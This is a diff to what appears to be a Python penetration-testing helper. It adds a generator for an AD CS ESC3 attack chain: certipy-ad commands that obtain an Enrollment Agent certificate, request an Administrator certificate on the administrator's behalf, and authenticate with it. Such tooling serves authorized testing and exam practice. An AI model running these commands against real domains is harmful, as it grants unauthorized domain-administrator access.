@@ -1600,6 +1600,38 @@ def run(report, store, ui=None):
                     f"-ca '{_ca7}' -retrieve <request-id> -dc-ip {_dc_esc}",
                     f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
                 ], src=tpl["src"], line=tpl["line"]))
+        # iter-120: R-ADCS-ESC3 - Enrollment Agent template. The vulnerable
+        # template carries the Certificate Request Agent EKU which lets the
+        # operator enroll for a cert then use that cert to enroll ON BEHALF OF
+        # another principal against the User template. Two-step certipy req
+        # chain; exam-legal (no relay, all manual).
+        _emitted_esc3 = set()
+        for tpl in e.cert_templates:
+            if tpl["lab_only"]:
+                continue
+            if "ESC3" not in tpl["esc"]:
+                continue
+            _tkey3 = (tpl["template"], tpl["ca"])
+            if _tkey3 in _emitted_esc3:
+                continue
+            _emitted_esc3.add(_tkey3)
+            _ca3 = tpl["ca"] or "<CA>"
+            _tpl3 = tpl["template"] or "<ea-template>"
+            chains.append(Chain("R-ADCS-ESC3", "ADCS ESC3 -> EA cert -> on-behalf-of admin",
+                f"ESC3 template '{_tpl3}' - Enrollment Agent EKU allows on-behalf-of enrollment",
+                crit=9, conf=0.85, ready=1.35, prox=0.9,     # score 9.29
+                commands=[
+                    f"# 1. enroll for the EA cert against the vulnerable template:",
+                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
+                    f"-ca '{_ca3}' -template '{_tpl3}' -pfx ea.pfx -dc-ip {_dc_esc}",
+                    f"# 2. use the EA cert to enroll for Administrator via User "
+                    f"template:",
+                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
+                    f"-ca '{_ca3}' -template User "
+                    f"-on-behalf-of '{_dom_esc}\\administrator' "
+                    f"-pfx ea.pfx -dc-ip {_dc_esc}",
+                    f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
+                ], src=tpl["src"], line=tpl["line"]))
 
     # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network).
     # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
